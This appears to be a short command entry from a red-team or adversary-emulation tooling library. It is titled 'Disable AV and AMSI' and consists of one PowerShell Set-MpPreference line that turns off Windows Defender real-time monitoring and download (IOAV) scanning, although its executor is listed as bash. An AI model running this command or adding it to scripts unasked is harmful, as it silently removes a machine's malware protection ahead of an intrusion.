---
id: 48581289-a755-409d-9b7f-03c6f46f51fd
name: Disable AV and AMSI
type: command
executor: bash
data: 'Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true

  '
output: null
created_at: '2020-07-15T19:05:44.361341+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Disable AV and AMSI

```bash
Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true

```


